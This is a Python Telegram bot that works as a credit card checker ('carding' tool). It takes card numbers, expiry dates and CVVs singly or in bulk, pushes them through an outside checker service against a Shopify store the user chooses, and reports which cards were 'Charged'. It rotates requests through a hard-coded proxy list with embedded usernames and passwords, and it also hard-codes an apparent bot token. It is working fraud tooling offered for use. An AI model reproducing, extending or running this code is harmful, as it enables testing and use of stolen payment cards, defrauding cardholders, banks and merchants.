import asyncio
import httpx
import json
import logging
import os
import time
import html
import random
import io
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters, CallbackQueryHandler
from telegram.constants import ParseMode

# --- Basic Setup ---
# Setup enhanced logging for better debugging.
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING) # Suppress noisy httpx logs
logger = logging.getLogger(__name__)

# --- Configuration ---
# It's highly recommended to use environment variables for tokens in production.
TELEGRAM_BOT_TOKEN = "7615802418:AAGKxCpVrDVGFbyd3aQi0_9G9CHGcJMCLEY" # Replace with your actual token
CHECKER_API_URL = "https://sigmabro766.onrender.com/"
BINLIST_API_URL = "https://lookup.binlist.net/"

# Combine and correctly format the new and old proxy lists.
# New format: ip:port:user:pass -> http://user:pass@ip:port
new_proxies_raw = [
    "38.154.227.167:5868:dmeigyzw:5ece3v7xz8d2", "198.23.239.134:6540:dmeigyzw:5ece3v7xz8d2",
    "207.244.217.165:6712:dmeigyzw:5ece3v7xz8d2", "107.172.163.27:6543:dmeigyzw:5ece3v7xz8d2",
    "216.10.27.159:6837:dmeigyzw:5ece3v7xz8d2", "142.147.128.93:6593:dmeigyzw:5ece3v7xz8d2",
    "64.64.118.149:6732:dmeigyzw:5ece3v7xz8d2", "136.0.207.84:6661:dmeigyzw:5ece3v7xz8d2",
    "206.41.172.74:6634:dmeigyzw:5ece3v7xz8d2", "104.239.105.125:6655:dmeigyzw:5ece3v7xz8d2",
]
formatted_new_proxies = [f"http://{p.split(':')[2]}:{p.split(':')[3]}@{p.split(':')[0]}:{p.split(':')[1]}" for p in new_proxies_raw]

PROXY_LIST = [
    "http://PP_2MX8KKO81J:soyjpcgu_country-us@ps-pro.porterproxies.com:31112",
    "http://In2nyCyUORV4KYeI:yXhbVJozQeBVVRnM@geo.g-w.info:10080",
] + formatted_new_proxies

COMMON_HTTP_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
}

# --- Bot UI & Constants ---
SPINNER_CHARS = ["⢿", "⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿"]
USER_SITES_FILE = "user_shopify_sites.json"

# --- User Data Persistence ---
current_user_shopify_site = {}

def load_user_sites():
    """Loads the user-site mapping from a JSON file at startup."""
    global current_user_shopify_site
    if not os.path.exists(USER_SITES_FILE):
        return
    try:
        with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            # Ensure user IDs are stored as integers
            current_user_shopify_site = {int(k): v for k, v in data.items()}
    except (json.JSONDecodeError, IOError) as e:
        logger.error(f"Could not load user sites from {USER_SITES_FILE}: {e}")
        current_user_shopify_site = {}

def save_user_sites():
    """Saves the current user-site mapping to a JSON file."""
    try:
        with open(USER_SITES_FILE, 'w', encoding='utf-8') as f:
            json.dump(current_user_shopify_site, f, indent=4)
    except IOError as e:
        logger.error(f"Could not save user sites to {USER_SITES_FILE}: {e}")

def get_site_for_user(user_id):
    """Retrieves the target Shopify site for a given user."""
    return current_user_shopify_site.get(user_id)

def set_site_for_user(user_id, site_url):
    """Sets the target Shopify site for a user and saves it."""
    current_user_shopify_site[user_id] = site_url
    save_user_sites()


# --- API & Data Processing Helpers ---
def parse_checker_api_response(response_text: str):
    """More robustly parses the JSON part of the checker API response."""
    if not response_text: return None
    # Find the start and end of the JSON object
    json_start_index = response_text.find('{')
    json_end_index = response_text.rfind('}')
    if json_start_index == -1 or json_end_index == -1:
        return None
    json_string = response_text[json_start_index : json_end_index + 1]
    try:
        return json.loads(json_string)
    except json.JSONDecodeError:
        return None

async def get_bin_details(bin_number: str):
    """Fetches credit card BIN details from Binlist.net."""
    default_response = {"scheme": "N/A", "type": "N/A", "brand": "N/A", "bank_name": "N/A", "country_name": "N/A", "country_emoji": "🌐"}
    if not bin_number or len(bin_number) < 6:
        return {**default_response, "error": "Invalid BIN"}

    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
    mounts = {'all://': proxy} if proxy else None

    try:
        headers = {'Accept-Version': '3', **COMMON_HTTP_HEADERS}
        async with httpx.AsyncClient(mounts=mounts, timeout=10.0) as client:
            response = await client.get(f"{BINLIST_API_URL}{bin_number.strip()}", headers=headers)

        if response.status_code == 200:
            data = response.json()
            return {
                "scheme": data.get("scheme", "N/A").upper(),
                "type": data.get("type", "N/A").upper(),
                "brand": data.get("brand", "N/A").upper(),
                "bank_name": data.get("bank", {}).get("name", "N/A"),
                "country_name": data.get("country", {}).get("name", "N/A"),
                "country_emoji": data.get("country", {}).get("emoji", "🌐")
            }
        elif response.status_code == 404:
            return {**default_response, "error": "BIN Not Found"}
        else:
            return {**default_response, "error": f"API Error {response.status_code}"}
    except httpx.RequestError as e:
        logger.error(f"BIN lookup failed for {bin_number}: {e}")
        return {**default_response, "error": "Network Error"}


# --- Bot Commands ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the /start command and displays the main menu."""
    user = update.effective_user
    user_name = html.escape(user.username if user.username else user.first_name)
    
    greeting_message = (
        f"<b>❖ AUTOSHOP CHECKER ❖</b>\n"
        f"<i>A robust checker bot by @alanjocc</i>\n"
        f"────────────────────────\n"
        f"👤 <b>User:</b> {user_name}\n"
        f"⚡️ <b>Status:</b> Ready to Check\n\n"
        f"Welcome! Please select an action from the menu below."
    )
    keyboard = [
        [InlineKeyboardButton("🔗 Set Target Site", callback_data="site:prompt_add"),
         InlineKeyboardButton("📍 My Current Site", callback_data="site:show_current")],
        [InlineKeyboardButton("📖 View Commands", callback_data="nav:show_cmds"),
         InlineKeyboardButton("🧑‍💻 Developer", url="https://t.me/alanjocc")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Edit the message if it's a callback query, otherwise send a new one.
    if update.callback_query:
        await update.callback_query.message.edit_text(
            greeting_message, reply_markup=reply_markup, parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_photo(
            photo='https://i.ibb.co/bJC2S0L/photo-2024-05-23-16-16-49.jpg', # A welcoming image
            caption=greeting_message,
            reply_markup=reply_markup,
            parse_mode=ParseMode.HTML
        )

async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Displays the list of available commands."""
    commands_text = (
        "<b>📖 BOT COMMANDS INDEX 📖</b>\n"
        "────────────────────────\n"
        "➤ /start - Shows the main menu.\n"
        "➤ /cmds - Displays this command list.\n\n"
        "➤ /add <code>&lt;url&gt;</code> - Sets the target Shopify site.\n"
        "➤ /my_site - Shows your currently set site.\n\n"
        "➤ /chk <code>N|M|Y|C</code> - Checks a single card.\n"
        "➤ /mchk - (As reply to a <code>.txt</code> file) Starts a mass check."
    )
    keyboard = [[InlineKeyboardButton("« Back to Main Menu", callback_data="nav:show_start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await update.callback_query.message.edit_text(
            commands_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(
            commands_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML
        )

async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Sets or updates the user's target Shopify site."""
    user_id = update.effective_user.id
    if not context.args or not context.args[0].startswith(("http://", "https://")):
        await update.message.reply_text(
            "⚠️ <b>Invalid URL Format!</b>\n"
            "Please use the format: /add <code>https://your-shop.com</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    site_url = context.args[0]
    set_site_for_user(user_id, site_url)
    
    response_message = (
        f"✅ <b>Site Updated Successfully!</b>\n"
        f"All checks will now be performed on:\n"
        f"🔗 <code>{html.escape(site_url)}</code>"
    )
    await update.message.reply_text(response_message, parse_mode=ParseMode.HTML)

async def my_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Displays the user's currently configured Shopify site."""
    user_id = update.effective_user.id
    shopify_site = get_site_for_user(user_id)
    
    if shopify_site:
        message_text = (
            f"📍 <b>Your Current Target Site:</b>\n"
            f"🔗 <code>{html.escape(shopify_site)}</code>"
        )
    else:
        message_text = "⚠️ No target site is set. Please use <b>/add &lt;url&gt;</b> to set one."
    
    keyboard = [[InlineKeyboardButton("« Back to Main Menu", callback_data="nav:show_start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.message.edit_text(
            message_text, parse_mode=ParseMode.HTML, reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            message_text, parse_mode=ParseMode.HTML, reply_markup=reply_markup
        )

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles single credit card checks."""
    user_id = update.effective_user.id
    shopify_site = get_site_for_user(user_id)
    
    if not shopify_site:
        await update.message.reply_text(
            "⚠️ <b>Site Not Set!</b>\nPlease use /add <code>&lt;site_url&gt;</code> first.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not context.args or context.args[0].count('|') != 3:
        await update.message.reply_text(
            "⚠️ <b>Invalid Format!</b>\nUse: /chk <code>CARD|MONTH|YEAR|CVV</code>",
            parse_mode=ParseMode.HTML
        )
        return
        
    cc_details_full = context.args[0]
    card_number = cc_details_full.split('|')[0]
    
    # Send a thinking message
    spinner_char = SPINNER_CHARS[0]
    processing_msg = await update.message.reply_text(
        f"Checking <code>{card_number[:6]}XX...</code> {spinner_char}", parse_mode=ParseMode.HTML
    )
    
    start_time = time.time()
    
    # Asynchronously get BIN details while preparing the main request
    bin_task = asyncio.create_task(get_bin_details(card_number[:6]))

    params = {"site": shopify_site, "cc": cc_details_full}
    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
    proxy_host = proxy.split('@')[-1].split(':')[0] if proxy else "Direct"
    mounts = {'all://': proxy} if proxy else None

    try:
        async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, mounts=mounts, timeout=45.0) as client:
            response = await client.get(CHECKER_API_URL, params=params)
        
        api_data = parse_checker_api_response(response.text)

        if api_data:
            api_response_text = api_data.get("Response", "Unknown Response")
            gateway = api_data.get("Gateway", "N/A")
            price = api_data.get("Price", "0.00")
            response_display = api_response_text

            if "Thank You" in response_display or "ORDER_PLACED" in response_display.upper():
                status_emoji, status_text = "💎", "Charged"
            elif "DECLINED" in response_display.upper():
                status_emoji, status_text = "❌", "Declined"
            else:
                status_emoji, status_text = "ℹ️", "Info"
        else:
            status_emoji, status_text = "❓", "API Error"
            gateway, price, response_display = "N/A", "0.00", response.text[:100].strip()

    except httpx.RequestError as e:
        status_emoji, status_text = "💥", "Network Error"
        gateway, price, response_display = "N/A", "0.00", str(e)
        logger.error(f"Error in chk_command: {e}")
    
    # Finalize
    time_taken = round(time.time() - start_time, 2)
    bin_data = await bin_task
    
    b = bin_data
    bin_info_str = " / ".join(filter(None, [b.get('scheme'), b.get('type'), b.get('brand')])) or "N/A"
    
    result_message = (
        f"<b>{status_emoji} {html.escape(status_text)}</b>\n"
        f"<b>Card:</b> <code>{html.escape(cc_details_full)}</code>\n"
        f"<b>Response:</b> <code>{html.escape(response_display)}</code>\n"
        f"<b>Gateway:</b> {html.escape(gateway)} ({html.escape(str(price))}$)\n"
        "────────────────────────\n"
        f"<b>BIN:</b> {bin_info_str}\n"
        f"<b>Bank:</b> {html.escape(b.get('bank_name', 'N/A'))}\n"
        f"<b>Country:</b> {b.get('country_emoji', '🌐')} {html.escape(b.get('country_name', 'N/A'))}\n"
        "────────────────────────\n"
        f"👤 <b>Checked by:</b> {html.escape(update.effective_user.first_name)}\n"
        f"⏱️ <b>Time:</b> {time_taken}s | 🌐 <b>Proxy:</b> {html.escape(proxy_host)}"
    )
    
    await processing_msg.edit_text(result_message, parse_mode=ParseMode.HTML)


async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles mass checking of cards from a .txt file."""
    user_id = update.effective_user.id
    shopify_site = get_site_for_user(user_id)
    if not shopify_site:
        await update.message.reply_text("⚠️ <b>Site Not Set!</b>\nPlease use /add <code>&lt;site_url&gt;</code> first.", parse_mode=ParseMode.HTML)
        return

    document = update.message.document or (update.message.reply_to_message and update.message.reply_to_message.document)
    if not document or document.mime_type != 'text/plain':
        await update.message.reply_text("⚠️ Please reply to a <code>.txt</code> file containing your cards and then type /mchk.", parse_mode=ParseMode.HTML)
        return

    file_obj = await context.bot.get_file(document.file_id)
    file_content = (await file_obj.download_as_bytearray()).decode('utf-8')
    ccs_to_check = [line.strip() for line in file_content.splitlines() if line.strip() and line.strip().count('|') == 3]

    if not ccs_to_check:
        await update.message.reply_text("⚠️ The provided file contains no valid card lines (N|M|Y|C).", parse_mode=ParseMode.HTML)
        return

    total_ccs = len(ccs_to_check)
    approved, declined, errors = 0, 0, 0
    results_log = [f"--- Mass Check Results for @{update.effective_user.username or user_id} on {shopify_site} ---\n"]
    
    start_mass_time = time.time()
    status_msg = await update.message.reply_text(f"🚀 Initializing mass check for {total_ccs} cards...", parse_mode=ParseMode.HTML)

    for i, cc_details in enumerate(ccs_to_check, 1):
        start_card_time = time.time()
        proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
        proxy_host = proxy.split('@')[-1].split(':')[0] if proxy else "Direct"
        mounts = {'all://': proxy} if proxy else None
        
        try:
            params = {"site": shopify_site, "cc": cc_details}
            async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, mounts=mounts, timeout=45.0) as client:
                response = await client.get(CHECKER_API_URL, params=params)
            
            api_data = parse_checker_api_response(response.text)
            if api_data:
                response_display = api_data.get("Response", "Unknown")
                if "Thank You" in response_display or "ORDER_PLACED" in response_display.upper():
                    status_emoji, status_text, approved = "💎", "Charged", approved + 1
                elif "DECLINED" in response_display.upper():
                    status_emoji, status_text, declined = "❌", "Declined", declined + 1
                else:
                    status_emoji, status_text = "ℹ️", "Info"
            else:
                status_emoji, status_text, response_display, errors = "❓", "API Error", response.text[:50].strip(), errors + 1
        except httpx.RequestError as e:
            status_emoji, status_text, response_display, errors = "💥", "Network Error", str(e), errors + 1
        
        time_taken = round(time.time() - start_card_time, 2)
        results_log.append(f"[{status_emoji}] {cc_details} -> {status_text} | {response_display}")
        
        # Update status message periodically to avoid hitting Telegram rate limits
        if i % 5 == 0 or i == total_ccs:
            live_status_text = (
                f"<b>❖ Mass Checking in Progress... ❖</b>\n"
                f"<b>Checked:</b> {i}/{total_ccs} | <b>Elapsed:</b> {round(time.time() - start_mass_time)}s\n"
                f"────────────────────────\n"
                f"💎 <b>Charged:</b> {approved} | ❌ <b>Declined:</b> {declined} | ⚠️ <b>Errors:</b> {errors}\n"
                f"────────────────────────\n"
                f"<b>Last Check:</b> <code>{cc_details.split('|')[0]}...</code>\n"
                f"<b>Status:</b> {status_emoji} {status_text} ({time_taken}s)"
            )
            try:
                await status_msg.edit_text(live_status_text, parse_mode=ParseMode.HTML)
            except Exception as e:
                logger.warning(f"Failed to edit mass check status message: {e}")
        
        await asyncio.sleep(1.0) # A small delay to be considerate to the APIs

    total_time = round(time.time() - start_mass_time, 2)
    final_summary_text = (
        f"<b>✅ Mass Check Complete!</b>\n"
        f"Processed {total_ccs} cards in {total_time} seconds.\n\n"
        f"<b>💎 Charged: {approved}</b>\n"
        f"<b>❌ Declined: {declined}</b>\n"
        f"<b>⚠️ Errors: {errors}</b>"
    )
    await status_msg.edit_text(final_summary_text, parse_mode=ParseMode.HTML)

    # Send the results log as a file using an in-memory buffer
    result_file_content = "\n".join(results_log)
    result_filename = f"ShopifyResults_{approved}_hits.txt"
    with io.BytesIO(result_file_content.encode('utf-8')) as f_to_send:
        f_to_send.name = result_filename
        await update.message.reply_document(
            document=f_to_send,
            caption=f"Full results for your mass check on <code>{html.escape(shopify_site)}</code>.",
            parse_mode=ParseMode.HTML
        )

async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles all inline button presses."""
    query = update.callback_query
    data = query.data
    await query.answer() # Acknowledge the button press

    if data == "nav:show_start":
        await start_command(update, context)
    elif data == "nav:show_cmds":
        await cmds_command(update, context)
    elif data == "site:prompt_add":
        await query.message.reply_text("🔗 <b>To set your target site, use the command:</b>\n/add <code>https://your-shop.com</code>", parse_mode=ParseMode.HTML)
    elif data == "site:show_current":
        await my_site_command(update, context)

def main():
    """Starts the bot."""
    if not TELEGRAM_BOT_TOKEN or "AAGKxCpVrDVGFbyd3aQi0_9G9CHGcJMCLEY" in TELEGRAM_BOT_TOKEN:
        logger.critical("CRITICAL: Telegram Bot Token is missing or is a placeholder!")
        return

    logger.info("Bot starting up...")
    load_user_sites()
    
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Register command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("cmds", cmds_command))
    application.add_handler(CommandHandler("add", add_command))
    application.add_handler(CommandHandler("my_site", my_site_command))
    application.add_handler(CommandHandler("chk", chk_command))
    
    # Register the handler for the /mchk command itself, often used in replies
    application.add_handler(CommandHandler("mchk", mchk_command))
    
    # Register the callback query handler for buttons
    application.add_handler(CallbackQueryHandler(button_callback_handler))

    logger.info("Bot is now polling for updates.")
    application.run_polling()

if __name__ == "__main__":
    main()
